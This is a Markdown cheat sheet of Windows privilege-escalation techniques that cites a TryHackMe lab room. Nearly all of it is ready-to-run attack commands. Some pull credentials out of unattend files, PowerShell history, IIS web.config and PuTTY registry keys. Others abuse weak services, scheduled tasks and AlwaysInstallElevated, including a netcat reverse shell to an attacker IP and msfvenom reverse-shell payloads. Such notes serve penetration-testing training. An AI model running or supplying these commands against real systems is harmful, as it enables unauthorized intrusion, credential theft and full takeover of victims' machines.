# Windows Privilege Escalation

* [Unattended Windows Installations](#unattended-windows-installations)
* [Powershell History](#powershell-history)
* [Saved Windows Credentials](#saved-windows-credentials)
* [Internet Information Services Configuration](#internet-information-services-configuration)
* [Retrieve Credentials from PuTTY](#retrieve-credentials-from-putty)
* [Scheduled Tasks](#scheduled-tasks)
* [AlwaysInstallElevated](#alwaysinstallelevated)
* [Insecure Permissions on Service Executable](#insecure-permissions-on-service-executable)
* [Unquoted Service Paths](#unquoted-service-paths)

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

## Unattended Windows Installations

Check these locations for credentials:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

********************************************

## Powershell History
From Command Prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
From PowerShell:
```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

********************************************

## Saved Windows Credentials

List saved credentials:
```
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option:
```
runas /savecred /user:admin cmd.exe
```

********************************************

## Internet Information Services Configuration
* (ISS)

Can find "web.config" in one of the following locations:
```
C:\inetpub\wwwroot\web.config
```
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

********************************************

## Retrieve Credentials from PuTTY

Search under the following registry key for ProxyPassword:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

********************************************

## Scheduled Tasks

List scheduled tasks with this command:
```
schtasks
```
* Look for "Task to Run" and "Run as User"
* Look at file executable permissions with:
```
icacls [FILE-PATH]
```
* Look for (F) in BUILTIN\Users
* Echo payload into file example:
```
echo c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT] > C:\tasks\schtask.bat
```
* Start a listener on attack machine
* Run the task:
```
schtasks /run /tn [TASK-NAME]
```
Check to see if the reverse shell connected

********************************************

## AlwaysInstallElevated

This method requires two registry values to be set. You can query these from the command line using the commands below:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=[ATTACK-PORT] -f msi -o malicious.msi
```
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

********************************************

## Insecure Permissions on Service Executable

Query service configuration with:
```
sc qc [SERVICE-NAME]
```
Note the BINARY_PATH_NAME and check the file permissions with:
```
icacls [BINARY-PATH-NAME]
```
* Look for (F)ull or (M)odify rights in various groups
* Create payload with:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
```
* Transfer the file to target machine and start a listener on attack machine
* Restart the insecure service:
```
sc stop [SERVICE-NAME]
```
```
sc start [SERVICE-NAME]
```
* There should be a shell on the attack machine
* Note: PowerShell has "sc" as an alias to "Set-Content", therefore you need to use "sc.exe" in order to control services with PowerShell this way.

********************************************

## Unquoted Service Paths

If there is is a program installed on the machine in a folder that is world writable (not "Program Files" or "x86 Program Files"), and it has spaces and not quoted when running "sc.exe qc [PROGRAM-FILE-PATH]" , you can create a malicious payload under a new executable with a shorter name and it will run when the longer name program runs. For example: if there is a program called "Disk Shorter.exe" (unquoted), you can create a new executable called "Disk.exe" and it will run when "Disk Shorter.exe" is called. use the same msfvenom command as above to generate a malicious payload:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
```

********************************************

### Reference:
* https://tryhackme.com/room/windowsprivesc20
